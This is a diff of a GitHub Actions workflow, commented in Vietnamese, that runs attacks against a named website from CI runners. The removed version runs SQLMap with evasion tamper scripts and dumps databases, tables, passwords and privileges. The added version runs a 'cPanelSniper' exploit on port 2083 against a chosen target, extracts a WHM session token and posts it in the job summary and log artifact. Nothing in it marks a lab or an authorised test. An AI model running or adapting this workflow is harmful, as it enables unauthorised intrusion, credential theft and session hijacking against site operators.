@@ -1,42 +1,62 @@
-name: Stealth SQLMap Scan
+name: Test cPanelSniper – Get Token
 
 on:
-  workflow_dispatch: # Cho phép bạn bấm nút chạy thủ công bất cứ lúc nào
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Mục tiêu (IP hoặc domain)'
+        required: true
+        default: 'checkccv.wiki'
+        type: string
 
 jobs:
-  stealth-scan:
+  scan:
     runs-on: ubuntu-latest
-
     steps:
-    - name: Checkout Repository
-      uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-    - name: Set up Python Environment
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.10'
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
 
-    - name: Download Latest SQLMap
-      run: |
-        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+      - name: Install requests
+        run: pip install requests
 
-    - name: Execute Stealth Dump
-      run: |
-        cd sqlmap-dev
-        python3 sqlmap.py -u "https://checkccv.wiki/?action=home&category=5" \
-          --force-dns \
-          --random-agent \
-          --tamper=space2comment,between,randomcase \
-          --delay=0.5 \
-          --threads=1 \
-          --level=3 \
-          --risk=2 \
-          --banner \
-          --current-user \
-          --current-db \
-          --is-dba \
-          --dbs \
-          --tables \
-          --passwords \
-          --privileges \
-          --batch
+      - name: Run exploit on port 2083
+        id: exploit
+        run: |
+          echo "🔍 Target: https://${{ github.event.inputs.target }}:2083"
+          echo "https://${{ github.event.inputs.target }}:2083" | python cPanelSniper.py 2>&1 | tee output.log
+          echo "::set-output name=log::$(cat output.log)"
+
+      - name: Extract token and show summary
+        run: |
+          echo "### Kết quả kiểm tra lỗ hổng" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          TOKEN=$(grep -oP '/cpsess[0-9]+' output.log | head -1)
+          if [ -n "$TOKEN" ]; then
+            echo "✅ **THÀNH CÔNG!** Lỗ hổng tồn tại." >> $GITHUB_STEP_SUMMARY
+            echo "🔑 **Token WHM:** \`$TOKEN\`" >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+            echo "📝 Dòng log chứa token:" >> $GITHUB_STEP_SUMMARY
+            echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
+            grep -i "token.*:/cpsess" output.log | head -1 >> $GITHUB_STEP_SUMMARY
+            echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
+          else
+            echo "❌ **Không tìm thấy token.**" >> $GITHUB_STEP_SUMMARY
+            echo "Máy chủ có thể đã được vá hoặc không bị ảnh hưởng." >> $GITHUB_STEP_SUMMARY
+          fi
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "### 📜 Toàn bộ log" >> $GITHUB_STEP_SUMMARY
+          echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
+          cat output.log >> $GITHUB_STEP_SUMMARY
+          echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
+
+      - name: Upload log artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: exploit-log
+          path: output.log
